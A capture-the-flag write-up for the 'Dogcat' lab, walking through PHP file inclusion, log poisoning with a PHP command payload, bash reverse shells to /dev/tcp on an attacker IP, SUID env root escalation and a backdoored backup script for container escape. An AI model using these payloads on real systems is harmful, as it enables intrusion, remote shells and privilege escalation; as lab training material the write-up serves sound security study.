# Dogcat CTF

## TL;DR

- **Entry:** PHP local file inclusion (LFI) via `?view=` + **path traversal** and **php://filter** → source disclosure and `/etc/passwd`.
- **Execution:** **Log poisoning** of Apache access log → include log to execute PHP → **reverse shell**.
- **PrivEsc #1 (container):** SUID-bit on `/usr/bin/env` → `bash -p` → **root in container**.
- **PrivEsc #2 (host):** Writable backup script in `/opt/backups/backup.sh` → command injection → **root on host**.
- **Loot:** `flag1` (web root), `flag2` (FS), `flag3` (container root), `flag4` (host root).

---

## Recon

![](/dogcat/index.png)

### Port scan

```bash
nmap -sV -Pn -oN nmap.txt 10.201.127.166
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```

Rationale: quick service discovery to pick the likely web attack surface. SSH noted but de-prioritized until creds/keys appear.

### Content discovery

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.201.127.166/\?view\=FUZZ -fw 77
acatalog                [Status: 200, Size: 759, Words: 106, Lines: 24, Duration: 171ms]
alcatel                 [Status: 200, Size: 757, Words: 106, Lines: 24, Duration: 174ms]
application             [Status: 200, Size: 765, Words: 106, Lines: 24, Duration: 178ms]
[OMITTED]
```

```bash
curl 'http://10.201.127.166/?view=acatalog'
[OMITTED]
<b>Warning</b>:  include(tomcat.php): failed to open stream: No such file or directory in <b>/var/www/html/index.php</b> on line <b>24</b><br />
<br />
<b>Warning</b>:  include(): Failed opening 'acatalog.php' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/index.php</b> on line <b>24</b>
```

Observation: the app **routes by `view`**, returning 200 for many tokens, hinting at a server-side `include` pattern. Errors show `include(<view>.php)` from `index.php`. Hypothesis: **LFI with extension control**.

---

## Vulnerability Analysis (LFI → RCE)

```bash
curl 'http://10.201.127.166/?view=php://filter/convert.base64-encode/resource=index' 
[OMITTED]
<br>
        Sorry, only dogs or cats are allowed.    </div>
```

### Source disclosure via php://filter

```bash
curl 'http://10.201.127.166/?view=php://filter/convert.base64-encode/resource=dog/../index' 
[OMITTED]
PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==
```

```bash
echo "PCFET0NUWVBFIEhUTUw+..." | base64 -d
[OMITTED]
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
```

Key insight: We can **bypass file type enforcement** using `&ext=` (empty) and use `php://filter` to read files. Also, the allowlist only gates the “happy path”; we can still hit the **else** branch and include arbitrary paths when paired with traversal.

### Read arbitrary files (path traversal)

```bash
curl 'http://10.201.127.166/?view=php://filter/convert.base64-encode/resource=dog/../../../../etc/passwd&ext=' 

[OMITTED]
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgo=    </div>
```

This confirms **LFI + traversal** and gives us OS context. At this point, two RCE paths are typical:

1) `php://input` inclusion (if enabled), or  
2) **Apache log poisoning** → include the log. We chose log poisoning (more deterministic).

### RCE via Apache log poisoning

1) **Poison log** with a PHP payload in **User-Agent**:

```bash
curl -A '"<?php system($_GET[x]); ?>' 'http://10.201.51.13/?view=dog'
```

1) **Trigger inclusion of access log** and execute a reverse shell:

```bash
# LFI include of access.log, no extension, run /bin/bash reverse shell
curl 'http://10.201.51.13/?view=dog/../../../../var/log/apache2/access.log&ext=&x=bash%20%2Dc%20%27exec%20bash%20%2Di%20%26%3E%2Fdev%2Ftcp%2F10%2E23%2E99%2E212%2F4444%20%3C%261%27'
```

```bash
# Listener
nc -lvnp 4444
Connection from 10.201.51.13:34398
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@6703c0ed25a3:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We land a `www-data` shell. Commentary: `php://input` could have been plan B if `allow_url_include`/stream wrappers were friendlier; logs were already confirmed readable, so poisoning was lower friction.

---

## Post-Exploitation (Web Container)

### Proofs & flags

```bash
# Web root
cat flag.php
<?php
$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
?>

cat ../flag2_QMW7JvaY2LvK.txt
THM{LF1_t0_RC3_aec3fb}
```

Thoughts: placing the first two flags in/near web root nudges the player to escalate further.

### Privilege escalation (container → root)

SUID check:

```bash
find / -perm -4000 -ls 2>/dev/null
   402184     52 -rwsr-xr-x   1 root     root        51280 Jan 10  2019 /bin/mount
   402201     64 -rwsr-xr-x   1 root     root        63568 Jan 10  2019 /bin/su
   402208     36 -rwsr-xr-x   1 root     root        34888 Jan 10  2019 /bin/umount
   403077     56 -rwsr-xr-x   1 root     root        54096 Jul 27  2018 /usr/bin/chfn
   403169     44 -rwsr-xr-x   1 root     root        44440 Jul 27  2018 /usr/bin/newgrp
   403179     64 -rwsr-xr-x   1 root     root        63736 Jul 27  2018 /usr/bin/passwd
   403080     44 -rwsr-xr-x   1 root     root        44528 Jul 27  2018 /usr/bin/chsh
   539630     44 -rwsr-sr-x   1 root     root        43680 Feb 28  2019 /usr/bin/env
   403126     84 -rwsr-xr-x   1 root     root        84016 Jul 27  2018 /usr/bin/gpasswd
   539824    156 -rwsr-xr-x   1 root     root       157192 Feb  2  2020 /usr/bin/sudo
```

Exploit:

```bash
/usr/bin/env /bin/bash -p
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)

cat /root/flag3.txt
THM{D1ff3r3nt_3nv1ronments_874112}
```

Comment: SUID `env` is a classic misconfig enabling `bash -p` (preserve privileges). Always strip SUID on generic binaries.

---

## Lateral / Escape to Host Root

```bash
ls -a /
.dockerenv
```

Enumeration hinted at **Dockerized environment** (`/.dockerenv`). In `/opt/backups`:

```bash
ls -l /opt/backups
cat backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```

**Writable** `backup.sh` lets us inject a one-liner reverse shell to hijack whatever executes it (likely cron/systemd on host bind-mount):

```bash
echo -e "bash -i >& /dev/tcp/10.23.99.212/9999 0>&1" >> /opt/backups/backup.sh

# Host listener
nc -lnvp 9999

# Shell pops as root on host
root@dogcat:~# ls
container
flag4.txt
cat flag4.txt
# THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
```

Commentary: This is a **build/backup pipeline abuse**—executable under higher privileges outside the container boundary. Integrity of scripts under `/opt/backups` must be enforced with permissions and signing.

